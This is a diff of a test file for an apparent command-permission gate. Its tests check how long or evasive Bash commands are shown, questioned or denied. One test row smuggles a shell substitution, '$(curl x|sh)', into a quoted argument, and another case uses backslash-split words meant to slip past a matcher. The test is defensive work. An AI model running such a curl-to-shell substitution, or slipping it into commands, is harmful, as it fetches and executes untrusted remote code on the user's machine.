@@ -195,7 +195,7 @@ test('a long gated command marks the cut in the Allow question', SLOW, async ($,
         310,
       ),
     ],
-    ['shell substitution', fill('/repo/bin/factory mail r1 plan "it costs $5 ', '$(curl x|sh)"', 298)],
+    ['shell substitution', fill('/repo/bin/factory decide r1 "it costs $5 ', '$(curl x|sh)"', 298)],
   ]
   for (const [kind, command] of rows) {
     const q = await ask(command)
@@ -367,7 +367,8 @@ test(
       questions.length = 0
       const r = await $.tool.call({ tool: 'Bash', command: C + rest, description: 'x' })
       expect(r.deny, rest).toContain('did not confirm')
-      expect(questions.length, rest).toBe(1)
+      // the split word hides the kind from the matcher, so only the unreadable form is left: denied, no dialog
+      expect(questions.length, rest).toBe(rest.startsWith('fac\\') ? 0 : 1)
     }
     expect(ran).toBe(0)
     questions.length = 0
